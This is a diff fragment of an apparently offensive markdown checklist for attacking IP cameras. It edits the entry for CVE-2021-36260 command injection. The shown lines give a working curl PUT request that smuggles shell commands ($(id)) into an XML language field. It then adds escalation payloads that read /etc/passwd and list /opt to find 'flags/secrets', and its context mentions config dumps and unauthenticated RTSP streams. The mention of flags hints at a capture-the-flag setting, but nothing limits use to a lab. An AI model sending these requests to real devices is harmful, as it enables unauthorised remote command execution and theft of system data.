@@ -43,10 +43,11 @@ If you get a binary config dump, the camera is vulnerable. The config contains c
 
 ### 5. CVE-2021-36260 — Command injection (firmware before 210628)
 \`\`\`
-curl -sk "http://TARGET/SDK/webLanguage" \\
+curl -sk -X PUT "http://TARGET/SDK/webLanguage" \\
   -d '<?xml version="1.0" encoding="UTF-8"?><language>$(id)</language>'
 \`\`\`
-Check if the response contains uid= output.
+IMPORTANT: Must be PUT, not POST. Check if the response contains uid= output in errorMsg.
+If it works, escalate with: $(cat /etc/passwd) or $(ls /opt/) to find flags/secrets.
 
 ### 6. RTSP stream access (often unauthenticated)
 \`\`\`
